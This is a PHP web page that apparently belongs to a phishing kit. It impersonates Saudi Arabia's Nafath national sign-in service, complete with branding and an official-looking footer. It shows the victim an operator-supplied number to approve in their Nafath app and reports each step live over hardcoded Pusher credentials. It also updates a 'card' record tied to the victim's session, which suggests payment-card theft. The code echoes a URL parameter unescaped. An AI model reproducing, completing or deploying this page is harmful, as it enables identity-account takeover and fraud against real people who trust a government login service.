<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'تحقق رمز تطبيق نفاذ');
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);
    $pusher->trigger('bcare', 'curreneft-page', ['userId' => $_SESSION['user_id'], 'page' => 'تحقق رمز تطبيق نفاذ']);
}

if (isset($_GET['reject'])) {
    $showError = true;
}

if (isset($_POST['submit_LogInToTheSystem'])) {
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);
    include("DB_CON.php");
    $X = 0;
    $q = "UPDATE card SET CheckTheInfo_Nafad='$X' WHERE id=" . $_SESSION['card_id'] . ";";
    
    if (mysqli_query($con, $q)) {
        mysqli_close($con);
        $userId = $_SESSION['user_id'];
        $User->UpdateStatus($userId, 'تحقق رمز تطبيق نفاذ');
        $pusher->trigger('bcare', 'update-user-accountt', [
            'userId' => $userId,
            'updatedData' => ['message' => 'تحقق رمز تطبيق نفاذ', 'type' => '3']
        ]);
        echo "<script>document.location.href='wait-nafath.php';</script>";
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الرمز | نفاذ</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --primary-nafad: #11998E;
            --bg-light: #f8fafc;
        }
        * { padding: 0; margin: 0; box-sizing: border-box; font-family: "Cairo", serif; }
        body { background-color: var(--bg-light); color: #1e293b; min-height: 100vh; display: flex; flex-direction: column; }
        
        .header-nafad { background: white; padding: 20px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .nafad-logo { height: 50px; }

        .auth-card {
            background: white;
            border-radius: 24px;
            padding: 40px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.03);
            max-width: 450px;
            width: 100%;
            margin: 40px auto;
            border: 1px solid rgba(0,0,0,0.05);
            text-align: center;
        }

        .timer-badge {
            background: #fff1f2;
            color: #e11d48;
            padding: 8px 16px;
            border-radius: 10px;
            font-weight: 700;
            font-size: 0.9rem;
            display: inline-block;
            margin-bottom: 20px;
        }

        .code-display {
            font-size: 4rem;
            font-weight: 900;
            color: var(--primary-nafad);
            background: #effaf9;
            width: 120px;
            height: 120px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 20px;
            margin: 30px auto;
            border: 3px solid var(--primary-nafad);
            box-shadow: 0 10px 25px rgba(17, 153, 142, 0.1);
        }

        .btn-confirm {
            height: 55px;
            border-radius: 12px;
            background: var(--primary-nafad);
            color: white;
            font-weight: 900;
            border: none;
            transition: all 0.3s;
            margin-bottom: 12px;
        }
        .btn-confirm:hover { background: #0d7e76; transform: translateY(-2px); }

        .btn-restart {
            height: 55px;
            border-radius: 12px;
            background: #f1f5f9;
            color: #64748b;
            font-weight: 700;
            border: 1px solid #e2e8f0;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s;
        }
        .btn-restart:hover { background: #e2e8f0; color: #1e293b; }

        footer { background: #f1f5f9; padding: 40px 0; margin-top: auto; }
        .footer-logo { height: 40px; opacity: 0.8; }
    </style>
</head>
<body>

    <header class="header-nafad text-center">
        <div class="container">
            <img src="./assets/nafad.png" alt="Nafath" class="nafad-logo">
        </div>
    </header>

    <main class="container">
        <div class="auth-card">
            <div class="timer-badge">
                <i class="bi bi-clock-history me-1"></i> تنتهي المهلة خلال: <span id="time">180</span> ثانية
            </div>

            <h5 class="fw-bold mb-2">تطبيق نفاذ</h5>
            <p class="text-muted small mb-0">يرجى فتح تطبيق نفاذ على جوالك</p>
            <p class="text-muted small">واختيار الرقم التالي لإتمام عملية التوثيق:</p>

            <div class="code-display">
                <?= $_GET['code'] ?? '00' ?>
            </div>

            <form method="POST">
                <button type="submit" name="submit_LogInToTheSystem" class="btn-confirm w-100">
                    تأكيد الاختيار <i class="bi bi-check2-circle ms-1"></i>
                </button>
                <a href="StepOne.php" class="btn-restart w-100">
                    البدء من جديد
                </a>
            </form>
        </div>
    </main>

    <footer>
        <div class="container">
            <div class="row align-items-center text-center text-md-start">
                <div class="col-md-6 mb-4 mb-md-0">
                    <h6 class="fw-900 mb-2">تطوير وتشغيل مركز المعلومات الوطني</h6>
                    <p class="text-muted small mb-0">النفاذ الوطني الموحد جميع الحقوق محفوظة © 2024</p>
                </div>
                <div class="col-md-6 text-md-end text-center">
                    <img src="./assets/NIC.png" alt="NIC" class="footer-logo">
                </div>
            </div>
        </div>
    </footer>

    <script>
        let timeLeft = 180;
        const timerSpan = document.getElementById('time');
        const timer = setInterval(() => {
            timeLeft--;
            timerSpan.textContent = timeLeft;
            if (timeLeft <= 0) {
                clearInterval(timer);
                window.location.href = 'StepOne.php';
            }
        }, 1000);
    </script>
    <!-- Error Modal -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center border-0 shadow-lg" style="border-radius: 24px;">
                <div class="modal-header-error p-5" style="background: #fff5f5;">
                    <div class="error-icon-wrapper mx-auto mb-4" style="width: 70px; height: 70px; background: #fee2e2; color: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">
                        <i class="bi bi-exclamation-triangle-fill"></i>
                    </div>
                    <h5 class="fw-900 text-dark mb-3">الرمز غير صحيح</h5>
                    <p class="text-muted small px-3">الرمز الذي اخترته في تطبيق نفاذ غير صحيح. يرجى التأكد من اختيار الرقم الصحيح والمحاولة مرة أخرى.</p>
                    <button class="btn w-100 mt-4" data-bs-dismiss="modal" style="background: #f1f5f9; color: #475569; height: 55px; border-radius: 12px; font-weight: 800;">حسناً، فهمت</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <script>
        $(document).ready(function() {
            <?php if (isset($showError) && $showError): ?>
            var myModal = new bootstrap.Modal(document.getElementById('errorModal'));
            myModal.show();
            <?php endif; ?>
        });
    </script>
    <script>
        var userIdFromSession = <?= json_encode($_SESSION['user_id']); ?>;
    </script>
    <?php include 'chat_widget.php'; ?>
</body>
</html>
